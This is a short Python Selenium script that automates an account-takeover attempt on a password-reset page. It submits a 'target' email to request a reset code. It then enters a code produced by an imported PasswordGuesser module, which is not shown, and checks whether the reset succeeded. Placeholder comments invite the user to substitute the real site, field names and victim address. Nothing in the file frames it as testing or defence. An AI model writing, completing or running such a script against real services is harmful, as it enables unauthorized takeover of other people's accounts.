import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from password_guesser import PasswordGuesser

def main():
    # Set up the Selenium WebDriver
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))

    try:
        # Open the target website
        driver.get("https://example.com/reset-password")  # Replace with the actual URL

        # Find the email input field and enter the email
        email_input = driver.find_element(By.NAME, "email")  # Replace with the actual name attribute
        email_input.send_keys("target_email@example.com")  # Replace with the target email

        # Submit the form to request a password reset
        email_input.send_keys(Keys.RETURN)

        # Wait for the page to load and find the code input field
        time.sleep(5)  # Adjust the sleep time as needed
        code_input = driver.find_element(By.NAME, "code")  # Replace with the actual name attribute

        # Initialize the password guesser
        guesser = PasswordGuesser()

        # Guess the reset code
        reset_code = guesser.guess_code()

        # Enter the guessed code
        code_input.send_keys(reset_code)

        # Submit the form with the guessed code
        code_input.send_keys(Keys.RETURN)

        # Wait for the page to load and check if the password has been reset
        time.sleep(5)  # Adjust the sleep time as needed

        # Check if the password reset was successful
        if "password_reset_successful" in driver.page_source:  # Replace with actual success indicator
            print("Password reset successful!")
        else:
            print("Password reset failed.")

    finally:
        # Close the WebDriver
        driver.quit()

if __name__ == "__main__":
    main()